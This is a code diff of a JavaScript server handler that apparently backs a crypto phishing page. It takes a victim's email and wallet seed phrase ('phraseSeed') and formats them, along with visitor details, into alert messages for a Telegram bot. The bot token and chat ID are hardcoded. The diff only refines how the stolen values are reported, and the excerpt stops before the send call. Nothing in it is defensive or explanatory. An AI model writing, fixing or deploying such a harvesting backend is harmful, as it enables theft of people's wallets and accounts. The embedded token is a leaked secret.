@@ -5,13 +5,12 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
-    const { email, phraseSeed, type } = req.body;
+    const { email, phraseSeed, description, type } = req.body;
 
-    // 🔥 HARDCODED CREDENTIALS (Fix the syntax here)
+    // 🔥 HARDCODED CREDENTIALS
     const TELEGRAM_BOT_TOKEN = "8786682796:AAFKWkeCO_sBxXlnrn7dWwXgRz8G2zX3fs0";
     const TELEGRAM_CHAT_ID = "5995903013";
 
-    // Optional check to make sure they exist
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.error('Missing Telegram credentials');
         return res.status(500).json({ error: 'Server config error' });
@@ -19,11 +18,14 @@ export default async function handler(req, res) {
 
     let message = '';
     if (type === 'visit') {
-        message = `🔔 New Visitor!\nAgent: ${phraseSeed || 'Unknown'}`;
+        // ✅ Use description for visits
+        message = `🔔 New Visitor!\nAgent: ${description || 'Unknown'}`;
     } else if (type === 'login') {
-        message = `🔐 New Login Attempt!\nEmail: ${email}\nPhraseSeed: ${phraseSeed}`;
+        // ✅ Use phraseSeed for login
+        message = `🔐 New Login Attempt!\nEmail: ${email}\nPhraseSeed: ${phraseSeed || 'No phrase seed provided'}`;
     } else {
-        message = `📩 Notification\nEmail: ${email}\nphraseSeed: ${phraseSeed}`;
+        // Fallback
+        message = `📩 Notification\nEmail: ${email}\nPhraseSeed: ${phraseSeed || description || 'Unknown'}`;
     }
 
     try {
